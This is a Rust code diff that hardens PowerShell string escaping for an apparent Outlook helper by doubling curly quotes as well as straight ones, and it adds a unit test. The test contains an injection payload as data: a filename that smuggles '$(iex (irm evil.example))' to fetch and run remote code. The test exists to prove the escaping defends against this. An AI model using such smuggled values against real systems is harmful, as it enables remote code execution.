@@ -53,9 +53,20 @@ pub struct Listing {
     pub messages: Vec<Message>,
 }
 
-/// A string inside PowerShell single quotes (nothing is expanded there; ' is doubled).
+/// A string inside PowerShell single quotes (nothing is expanded there). PowerShell takes
+/// the curly quotes ‘ ’ ‚ ‛ for ' too, so each of them is doubled as well: a name with
+/// one in it (an attachment, a subject) must never close the string.
 pub fn ps(s: &str) -> String {
-    format!("'{}'", s.replace('\'', "''"))
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('\'');
+    for c in s.chars() {
+        if matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') {
+            out.push(c);
+        }
+        out.push(c);
+    }
+    out.push('\'');
+    out
 }
 
 /// Attaches to the running Outlook, or prints {"error":"notRunning"} and stops. JSON goes
@@ -420,6 +431,16 @@ mod tests {
         assert!(s.contains("GetActiveObject('Outlook.Application')"));
         assert!(!s.contains("New-Object -ComObject"), "never starts Outlook");
         assert!(s.contains("$n -lt 12") && s.contains("GetDefaultFolder(6)") && s.contains("ConvertTo-Json"));
+    }
+
+    #[test]
+    fn every_quote_powershell_knows_is_doubled() {
+        assert_eq!(ps("plain"), "'plain'");
+        assert_eq!(ps("l'été"), "'l''été'");
+        // Curly quotes close a single-quoted string in PowerShell just as ' does.
+        let name = "x\u{2019} -or $(iex (irm evil.example)) -or \u{2018}.pdf";
+        assert_eq!(ps(name), "'x\u{2019}\u{2019} -or $(iex (irm evil.example)) -or \u{2018}\u{2018}.pdf'");
+        assert_eq!(ps("\u{201A}\u{201B}"), "'\u{201A}\u{201A}\u{201B}\u{201B}'");
     }
 
     #[test]
